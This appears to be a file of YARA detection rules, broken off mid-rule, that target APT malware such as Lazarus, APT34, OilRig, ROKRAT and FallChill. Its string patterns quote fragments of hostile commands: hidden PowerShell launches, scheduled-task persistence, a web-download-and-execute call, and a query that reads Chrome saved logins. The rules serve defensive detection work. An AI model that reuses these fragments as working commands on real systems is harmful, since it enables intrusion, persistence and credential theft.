Lazarus_Dec_17_2_RID2CB6 : APT DEMO EXE FILE G0032 NK {\n   meta:\n      description = \"Detects Lazarus malware from incident in Dec 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new\"\n      date = \"2017-12-20 10:00:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"cbebafb2f4d77967ffb1a74aac09633b5af616046f31dddf899019ba78a55411\"\n      hash2 = \"9ca3e56dcb2d1b92e88a0d09d8cab2207ee6d1f55bada744ef81e8b8cf155453\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SkypeSetup.exe\" fullword wide\n      $s2 = \"%s\\\\SkypeSetup.exe\" fullword ascii\n      $s3 = \"Skype Technologies S.A.\" fullword wide\n      $a1 = \"Microsoft Code Signing PCA\" ascii wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 7000KB and ( all of ( $s* ) and not $a1 )\n}\n\nrule Lazarus_Dec_17_4_RID2CB8 : APT DEMO G0032 NK {\n   meta:\n      description = \"Detects Lazarus malware from incident in Dec 2017ithumb.js\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new\"\n      date = \"2017-12-20 10:01:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"8ff100ca86cb62117f1290e71d5f9c0519661d6c955d9fcfb71f0bbdf75b51b3\"\n      hash2 = \"7975c09dd436fededd38acee9769ad367bfe07c769770bd152f33a10ed36529e\"\n      tags = \"APT, DEMO, G0032, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"var _0xf5ed=[\\\"\\\\x57\\\\x53\\\\x63\\\\x72\\\\x69\\\\x70\\\\x74\\\\x2E\\\\x53\\\\x68\\\\x65\\\\x6C\\\\x6C\\\",\" ascii\n   condition: \n      filesize < 9KB and 1 of them\n}\n\nrule Lazarus_Dec_17_5_RID2CB9 : APT DEMO G0032 NK T1033 T1053_005 {\n   meta:\n      description = \"Detects Lazarus malware from incident in Dec 2017\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new\"\n      date = \"2017-12-20 10:01:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"db8163d054a35522d0dec35743cfd2c9872e0eb446467b573a79f84d61761471\"\n      tags = \"APT, DEMO, G0032, NK, T1033, T1053_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$ProID = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList\" fullword ascii\n      $x2 = \"$respTxt = HttpRequestFunc_doprocess -szURI $szFullURL -szMethod $szMethod -contentData $contentData;\" fullword ascii\n      $x3 = \"[String]$PS_PATH = \\\"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\Documents\\\\\\\\ProxyAutoUpdate.ps1\\\";\" fullword ascii\n      $x4 = \"$cmdSchedule = 'schtasks /create /tn \\\"ProxyServerUpdater\\\"\" ascii\n      $x5 = \"/tr \\\"powershell.exe -ep bypass -windowstyle hidden -file \" ascii\n      $x6 = \"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\Documents\\\\\\\\tmp' + -join \" ascii\n      $x7 = \"$cmdResult = cmd.exe /c $cmdInst | Out-String;\" fullword ascii\n      $x8 = \"whoami /groups | findstr /c:\\\"S-1-5-32-544\\\"\" fullword ascii\n   condition: \n      filesize < 500KB and 1 of them\n}\n\nrule Invoke_PSImage_RID2C62 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects a command to execute PowerShell from String\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/peewpw/Invoke-PSImage\"\n      date = \"2017-12-16 09:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"IEX([System.Text.Encoding]::ASCII.GetString(\" ascii wide\n      $ = \"System.Drawing.Bitmap((a Net.WebClient).OpenRead(\" ascii wide\n      $ = { 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52\n            00 00 04 E4 00 00 03 A0 08 06 00 00 00 9D AF A9\n            E8 00 00 00 09 70 48 59 73 00 00 19 D6 00 00 19\n            D6 01 18 D1 CA ED 00 00 00 07 74 49 4D 45 07 E1\n            0C 0F 13 1E 36 89 C4 28 BF 00 00 00 07 74 45 58\n            74 41 75 74 68 6F 72 00 A9 AE CC 48 00 00 00 0C\n            74 45 58 74 44 65 73 63 72 69 70 74 69 6F 6E 00\n            13 09 21 23 00 00 00 0A 74 45 58 74 43 6F 70 79\n            72 69 67 68 74 00 AC 0F CC 3A 00 00 00 0E 74 45\n            58 74 43 72 65 61 74 69 6F 6E 20 74 69 6D 65 00\n            35 F7 0F } \n   condition: \n      filesize < 3000KB and 1 of them\n}\n\nrule Triton_trilog_RID2C81 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Triton APT malware - file trilog.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://cloud.google.com/blog/topics/threat-intelligence/attackers-deploy-new-ics-attack-framework-triton/\"\n      date = \"2017-12-14 09:52:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"e8542c07b2af63ee7e72ce5d97d91036c5da56e2b091aa2afe737b224305d230\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"inject.bin\" ascii\n      $s2 = \"PYTHON27.DLL\" fullword ascii\n      $s3 = \"payload\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule Suspicious_AutoIt_by_Microsoft_RID334C : DEMO EXE FILE SCRIPT SUSP {\n   meta:\n      description = \"Detects a AutoIt script with Microsoft identification\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - VT\"\n      date = \"2017-12-14 14:41:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c0cbcc598d4e8b501aa0bd92115b4c68ccda0993ca0c6ce19edd2e04416b6213\"\n      tags = \"DEMO, EXE, FILE, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Microsoft Corporation. All rights reserved\" fullword wide\n      $s2 = \"AutoIt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule ZXshell_20171211_chrsben_RID2F0D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ZxShell variant surfaced in Dec 17\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/#/file/dd01e7a1c9b20d36ea2d961737780f2c0d56005c370e50247e38c5ca80dcaa4f/detection\"\n      date = \"2017-12-11 11:40:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"dd01e7a1c9b20d36ea2d961737780f2c0d56005c370e50247e38c5ca80dcaa4f\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"ncProxyXll\" fullword ascii\n      $s1 = \"Uniscribe.dll\" fullword ascii\n      $s2 = \"GetModuleFileNameDll\" fullword ascii\n      $s4 = \"$Hangzhou Shunwang Technology Co.,Ltd0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( pe.imphash ( ) == \"de481441d675e9aca4f20bd8e16a5faa\" or pe.exports ( \"PerfectWorld\" ) or pe.exports ( \"ncProxyXll\" ) or 1 of ( $x* ) or 2 of them )\n}\n\nrule xRAT_1_RID2900 : APT DEMO EXE FILE G0040 {\n   meta:\n      description = \"Detects Patchwork malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Pg3P4W\"\n      date = \"2017-12-11 19:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"92be93ec4cbe76182404af0b180871fbbfa3c7b34e4df6745dbcde480b8b4b3b\"\n      hash2 = \"f1a45adcf907e660ec848c6086e28c9863b7b70d0d38417dd05a4261973c955a\"\n      tags = \"APT, DEMO, EXE, FILE, G0040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\" -CHECK & PING -n 2 127.0.0.1 & EXIT\" fullword wide\n      $x2 = \"xClient.Core.Elevation\" fullword ascii\n      $x3 = \">> Welcome to MAX-Shell :Session created\" fullword wide\n      $x4 = \"xClient.Properties.Resources.resources\" fullword ascii\n      $x5 = \"<description>My UAC Compatible application</description>\" fullword ascii\n      $s1 = \"ping -n 20 localhost > nul\" fullword wide\n      $s2 = \"DownloadAndExecute\" fullword ascii\n      $s3 = \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36\" fullword wide\n      $s4 = \"Client.exe\" fullword ascii\n      $s5 = \"Microsoft -Defender\" fullword wide\n      $s6 = \"Microsoft- Defender\" fullword wide\n      $s7 = \"set_RunHidden\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule ReconCommands_in_File_RID2F4F : DEMO FILE SUSP T1007 T1033 T1057 T1082 {\n   meta:\n      description = \"Detects various recon commands in a single file\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/haroonmeer/status/939099379834658817\"\n      date = \"2017-12-11 11:51:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, SUSP, T1007, T1033, T1057, T1082\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"tasklist\" \n      $ = \"net time\" \n      $ = \"systeminfo\" \n      $ = \"whoami\" \n      $ = \"nbtstat\" \n      $ = \"net start\" \n      $ = \"qprocess\" \n      $ = \"nslookup\" \n   condition: \n      filesize < 5KB and 4 of them\n}\n\nrule APT34_Malware_HTA_RID2CC1 : DEMO G0049 G0057 MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects APT 34 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html\"\n      date = \"2017-12-07 10:02:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f6fa94cc8efea0dbd7d4d4ca4cf85ac6da97ee5cf0c59d16a6aafccd2b9d8b9a\"\n      tags = \"DEMO, G0049, G0057, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"WshShell.run \\\"cmd.exe /C C:\\\\ProgramData\\\\\" ascii\n      $x2 = \".bat&ping 127.0.0.1 -n 6 > nul&wscript  /b\" ascii\n      $x3 = \"cmd.exe /C certutil -f  -decode C:\\\\ProgramData\\\\\" ascii\n      $x4 = \"a.WriteLine(\\\"set Shell0 = CreateObject(\" ascii\n      $x5 = \"& vbCrLf & \\\"Shell0.run\" ascii\n      $s1 = \"<title>Blog.tkacprow.pl: HTA Hello World!</title>\" fullword ascii\n      $s2 = \"<body onload=\\\"test()\\\">\" fullword ascii\n   condition: \n      filesize < 60KB and ( 1 of ( $x* ) or all of ( $s* ) )\n}\n\nrule APT34_Malware_Exeruner_RID2F32 : DEMO EXE FILE G0049 G0057 MAL MIDDLE_EAST T1053_005 {\n   meta:\n      description = \"Detects APT 34 malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html\"\n      date = \"2017-12-07 11:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c75c85acf0e0092d688a605778425ba4cb2a57878925eee3dc0f4dd8d636a27a\"\n      tags = \"DEMO, EXE, FILE, G0049, G0057, MAL, MIDDLE_EAST, T1053_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\obj\\\\Debug\\\\exeruner.pdb\" ascii\n      $x2 = \"\\\"wscript.shell`\\\")`nShell0.run\" wide\n      $x3 = \"powershell.exe -exec bypass -enc \\\" + ${global:$http_ag} +\" wide\n      $x4 = \"/c powershell -exec bypass -window hidden -nologo -command \" fullword wide\n      $x5 = \"\\\\UpdateTasks\\\\JavaUpdatesTasksHosts\\\\\" wide\n      $x6 = \"schtasks /create /F /ru SYSTEM /sc minute /mo 1 /tn\" wide\n      $x7 = \"UpdateChecker.ps1 & ping 127.0.0.1\" wide\n      $s8 = \"exeruner.exe\" fullword wide\n      $s9 = \"${global:$address1} = $env:ProgramData + \\\"\\\\Windows\\\\Microsoft\\\\java\\\";\" fullword wide\n      $s10 = \"C:\\\\ProgramData\\\\Windows\\\\Microsoft\\\\java\" fullword wide\n      $s11 = \"function runByVBS\" fullword wide\n      $s12 = \"$84e31856-683b-41c0-81dd-a02d8b795026\" fullword ascii\n      $s13 = \"${global:$dns_ag} = \\\"aQBmACAAKAAoAEcAZQB0AC0AVwBtAGk\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule Suspicious_JS_script_content_RID3292 : DEMO SCRIPT T1059 T1218_010 {\n   meta:\n      description = \"Detects suspicious statements in JavaScript files\"\n      author = \"Florian Roth\"\n      reference = \"Research on Leviathan https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets\"\n      date = \"2017-12-02 14:10:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"fc0fad39b461eb1cfc6be57932993fcea94fca650564271d1b74dd850c81602f\"\n      tags = \"DEMO, SCRIPT, T1059, T1218_010\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"new ActiveXObject('WScript.Shell')).Run('cmd /c \" ascii\n      $x2 = \".Run('regsvr32 /s /u /i:\" ascii\n      $x3 = \"new ActiveXObject('WScript.Shell')).Run('regsvr32 /s\" fullword ascii\n      $x4 = \"args='/s /u /i:\" ascii\n   condition: \n      ( filesize < 10KB and 1 of them )\n}\n\nrule Universal_Exploit_Strings_RID3157 : DEMO EXPLOIT SUSP {\n   meta:\n      description = \"Detects a group of strings often used in exploit codes\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2017-12-02 13:18:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9b07dacf8a45218ede6d64327c38478640ff17d0f1e525bd392c002e49fe3629\"\n      tags = \"DEMO, EXPLOIT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Exploit\" fullword ascii\n      $s2 = \"Payload\" fullword ascii\n      $s3 = \"CVE-201\" ascii\n      $s4 = \"bindshell\" \n   condition: \n      ( filesize < 2KB and 3 of them )\n}\n\nrule UBootRAT_RID29E1 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects UBoot RAT Samples\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/\"\n      date = \"2017-11-29 02:00:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"04873dbd63279228a0a4bb1184933b64adb880e874bd3d14078161d06e232c9b\"\n      hash2 = \"7b32f401e2ad577e8398b2975ecb5c5ce68c5b07717b1e0d762f90a6fbd8add1\"\n      hash3 = \"42d8a84cd49ff3afacf3d549fbab1fa80d5eda0c8625938b6d32e18004b0edac\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"URLDownloadToFileA\" ascii\n      $s2 = \"GetModuleFileNameW\" ascii\n      $s4 = \"WININET.dll\" ascii\n      $s5 = \"urlmon.dll\" ascii\n      $s6 = \"WTSAPI32.dll\" ascii\n      $s7 = \"IPHLPAPI.DLL\" ascii\n      $op1 = { 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68\n               69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F\n               74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20\n               6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 } \n      $vprotect = { 2E 76 6D 70 30 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and uint32 ( uint32 ( 0x3c ) ) == 0x4550 and filesize < 1400KB and filesize > 800KB and ( all of ( $s* ) and $op1 at 64 and uint16 ( uint32 ( 0x3c ) + 11 ) == 0x59 and $vprotect in ( 600 .. 700 ) )\n}\n\nrule UBootRAT_Dropper_RID2D1C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects UBootRAT Dropper\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/\"\n      date = \"2017-11-29 10:17:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f4c659238ffab95e87894d2c556f887774dce2431e8cb87f881df4e4d26253a3\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetCurrenvackageId\" fullword ascii\n      $s2 = \"fghijklmnopq\" fullword ascii\n      $s3 = \"23456789:;<=>?@ABCDEFGHIJKLMNOPQ\" fullword ascii\n      $s4 = \"PMM/dd/y\" fullword ascii\n      $s5 = \"bad all\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule ROKRAT_Dropper_Nov17_RID2E19 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects dropper for ROKRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html\"\n      date = \"2017-11-28 11:00:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"eb6d25e08b2b32a736b57f8df22db6d03dc82f16da554f4e8bb67120eacb1d14\"\n      hash2 = \"a29b07a6fe5d7ce3147dd7ef1d7d18df16e347f37282c43139d53cce25ae7037\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and pe.imphash ( ) == \"c6187b1b5f4433318748457719dd6f39\"\n}\n\nrule Freeenki_Infostealer_Nov17_RID310F : DEMO EXE FILE MAL T1003 T1218_011 {\n   meta:\n      description = \"Detects Freenki infostealer malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html\"\n      date = \"2017-11-28 13:06:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5\"\n      tags = \"DEMO, EXE, FILE, MAL, T1003, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"base64Encoded=\\\"TVqQAAMAAAAEAAAA\" ascii\n      $x2 = \"command =outFile &\\\" sysupdate\\\"\" fullword ascii\n      $x3 = \"outFile=sysDir&\\\"\\\\rundll32.exe\\\"\" fullword ascii\n      $s1 = \"SOFTWARE\\\\Clients\\\\StartMenuInternet\\\\firefox.exe\\\\shell\\\\open\\\\command\" fullword wide\n      $s2 = \"c:\\\\TEMP\\\\CrashReports\\\\\" ascii\n      $s3 = \"objShell.run command, 0, True\" fullword ascii\n      $s4 = \"sysDir = shell.ExpandEnvironmentStrings(\\\"%windir%\\\")\" fullword ascii\n      $s5 = \"'Wscript.echo \\\"Base64 encoded: \\\" + base64Encoded\" fullword ascii\n      $s6 = \"set shell = WScript.CreateObject(\\\"WScript.Shell\\\")\" fullword ascii\n      $a1 = \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" ascii\n      $a2 = \"SELECT username_value, password_value, signon_realm FROM logins\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of ( $x* ) or 3 of them or all of ( $a* ) )\n}\n\nrule Freeenki_Infostealer_Nov17_Export_Sig_Testing_RID38AF : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Freenki infostealer malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html\"\n      date = \"2017-11-28 18:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.6.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and pe.exports ( \"getUpdate\" ) and pe.number_of_exports == 1\n}\n\nrule ROKRAT_Nov17_1_RID2B6E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ROKRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-11-28 09:06:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\T+M\\\\Result\\\\DocPrint.pdb\" ascii\n      $s2 = \"d:\\\\HighSchool\\\\version 13\\\\2ndBD\" ascii\n      $s3 = \"e:\\\\Happy\\\\Work\\\\Source\\\\version\" ascii\n      $x1 = \"\\\\appdata\\\\local\\\\svchost.exe\" ascii\n      $x2 = \"c:\\\\temp\\\\esoftscrap.jpg\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 1 of them )\n}\n\nrule Greenbug_Malware_Nov17_1_RID2FF2 : DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Greenbug Malware\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/greenbug/\"\n      date = \"2017-11-26 12:18:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6e55e161dc9ace3076640a36ef4a8819bb85c6d5e88d8e852088478f79cf3b7c\"\n      hash2 = \"a9f1375da973b229eb649dc3c07484ae7513032b79665efe78c0e55a6e716821\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"AgentV2.exe  -c  SampleDomain.com\" fullword ascii\n      $x2 = \".ntpupdateserver.com\" fullword ascii\n      $x3 = \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"a.a\\\"\" fullword ascii\n      $x4 = \"a67d0db885a3432576548a2a03707334\" fullword ascii\n      $x5 = \"a67d0db8a2a173347654432503702aa3\" fullword ascii\n      $x6 = \"!!! can not create output file !!!\" fullword ascii\n      $s1 = \"\\\\runlog*\" ascii\n      $s2 = \"can not specify username!!\" fullword ascii\n      $s3 = \"Agent can not be configured\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == \"58ba44f7ff5436a603fec3df97d815ea\" or pe.imphash ( ) == \"538805ecd776b9a42e71aebf94fde1b1\" or 1 of ( $x* ) or 3 of them )\n}\n\nrule OilRig_Malware_Nov17_13_RID2F3C : DEMO EXE FILE G0049 MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects OilRig DNSCat malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ClearskySec/status/933280188733018113\"\n      date = \"2017-11-22 11:48:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4f1e2df85c538875a7da877719555e21c33a558ac121eb715cf4e779d77ab445\"\n      tags = \"DEMO, EXE, FILE, G0049, MAL, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\dnscat2.pdb\" ascii\n      $x2 = \"cscript.exe //T:20 //Nologo \" fullword ascii\n      $a1 = \"taskkill /F /IM cscript.exe\" fullword ascii\n      $a2 = \"cmd.exe /c \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == \"0160250adfc97f9d4a12dd067323ec61\" or 1 of ( $x* ) or all of ( $a* ) )\n}\n\nrule Webshell_FOPO_Obfuscation_APT_ON_Nov17_1_RID3580 : APT DEMO FILE NK OBFUS T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects malware from NK APT incident DE\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - ON\"\n      date = \"2017-11-17 16:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2020-07-31\"\n      hash1 = \"ed6e2e0027d3f564f5ce438984dc8a54577df822ce56ce079c60c99a91d5ffb1\"\n      tags = \"APT, DEMO, FILE, NK, OBFUS, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Obfuscation provided by FOPO\" fullword ascii\n      $s1 = \"\\\";@eval($\" ascii\n      $f1 = { 22 29 29 3B 0D 0A 3F 3E } \n   condition: \n      uint16 ( 0 ) == 0x3f3c and filesize < 800KB and ( $x1 or ( $s1 in ( 0 .. 350 ) and $f1 at ( filesize - 23 ) ) )\n}\n\nrule HiddenCobra_FallChill_1_RID2F9E : APT DEMO EXE FILE G0032 NK T1218_010 {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-318A\"\n      date = \"2017-11-15 12:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a606716355035d4a1ea0b15f3bee30aad41a2c32df28c2d468eafd18361d60d6\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, NK, T1218_010\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"REGSVR32.EXE.MUI\" fullword wide\n      $s2 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n      $s3 = \"c%sd.e%sc %s > \\\"%s\\\" 2>&1\" fullword wide\n      $s4 = \"\\\" goto Loop\" fullword ascii\n      $e1 = \"xolhvhlxpvg\" fullword ascii\n      $e2 = \"tvgslhgybmanv\" fullword ascii\n      $e3 = \"CivagvTllosvok32Smakhslg\" fullword ascii\n      $e4 = \"GvgCfiivmgDrivxglibW\" fullword ascii\n      $e5 = \"OkvmPilxvhhTlpvm\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"6135d9bc3591ae7bc72d070eadd31755\" or 3 of ( $s* ) or 4 of them )\n}\n\nrule HiddenCobra_FallChill_2_RID2F9F : APT DEMO EXE FILE G0032 NK {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-318A\"\n      date = \"2017-11-15 12:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0a118eb23399000d148186b9079fa59caf4c3faa7e7a8f91533e467ac9b6ff41\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, NK\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"%s\\\\%s.dll\" fullword wide\n      $s2 = \"yurdkr.dll\" fullword ascii\n      $s3 = \"c%sd.e%sc %s > \\\"%s\\\" 2>&1\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == 